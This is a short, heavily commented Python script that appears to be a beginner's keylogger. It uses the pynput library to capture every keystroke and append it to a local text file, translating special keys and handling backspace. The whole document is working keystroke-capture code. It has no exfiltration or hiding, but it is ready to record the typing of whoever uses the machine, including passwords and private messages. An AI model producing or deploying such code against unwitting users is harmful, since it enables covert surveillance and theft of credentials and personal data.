from pynput.keyboard import Key, Listener

def file_save(key):                  # a function that is called whenever a key is pressed
    data_key = str(key)                     # converts pressed key into string
    if data_key == "Key.backspace":         # checks if backspace is pressed if it is then calls delete_last_character
        delete_last_character()
    else:

        data_key = data_key.replace("'", "")  # removes single quotes and replaces them with nothing
        if data_key == "Key.space":
            data_key = " "
        if data_key == "Key.shift_r":
            data_key = ""
        if data_key == "Key.ctrl_l":  # from line 9 to line 18 it checks if it can match Space, Shift, Ctrl, Enter, etc.
            data_key = ""             # and replaces them with the given character
        if data_key == "Key.enter":
            data_key = "\n"
        if data_key == "Key.shift":
            data_key = ""
        if data_key == "Key.left":
            data_key = ""
        if data_key == "Key.right":
            data_key = ""
        if data_key == "Key.up":
            data_key = ""
        if data_key == "Key.down":
            data_key = ""
        with open("text.txt", "a") as keylogger:  # opens a text file in append mode, it uses 'with' to properly close it
            keylogger.write(data_key)             # write the value in text.txt or replaces it with the given 'if' options

def delete_last_character():                      # the function for backspace
    with open("text.txt", "r+") as key:           # opens the text file in read and write mode
        letter = list(key.read())
        if letter:                                # checks whether the list is empty
            letter.pop()                          # removes last letter
            key.seek(0)                           # brings the pointer to the beginning of the file
            key.truncate()                        # reduces the size and makes sure all the unnecessary letters are gone
            key.write(''.join(letter))            # writes the modified content back to the file

with Listener(on_press=file_save) as L:     # Listens for keyboard events 'on_press' specifies the function to be called
    L.join()                                # Starts the listeners until it is stopped
